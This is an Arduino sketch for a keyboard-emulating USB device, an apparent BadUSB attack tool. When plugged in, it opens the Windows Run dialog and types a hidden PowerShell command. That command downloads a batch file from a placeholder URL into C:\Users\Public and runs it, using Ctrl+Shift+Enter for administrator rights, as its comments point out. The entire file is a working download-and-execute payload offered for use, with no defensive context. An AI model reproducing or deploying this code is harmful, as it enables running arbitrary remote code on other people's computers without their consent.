#include "Keyboard.h"

void typeKey(int key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup() {
  Keyboard.begin();
  delay(500);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(700);
  Keyboard.print("powershell -w hidden -Command \"Invoke-WebRequest -Uri ");
  delay(700);
  Keyboard.print("'[URL BATCH FILE URL(eg-google drive link)]' "); // Use "https://sites.google.com/site/gdocs2direct/" to convert your google drive link to downloadable 
  delay(700);
  Keyboard.print("-OutFile 'C:\\Users\\Public\\f2.bat'; cmd /c C:\\Users\\Public\\f2.bat; exit\"");
  Keyboard.press(KEY_LEFT_CTRL); //    }
  Keyboard.press(KEY_LEFT_SHIFT); //   }   }  This is important as it will give open administrative powershell.
  Keyboard.press(KEY_RETURN); //       }  
  Keyboard.releaseAll();
  
}

void loop() {
  // put your main code here, to run repeatedly:

}
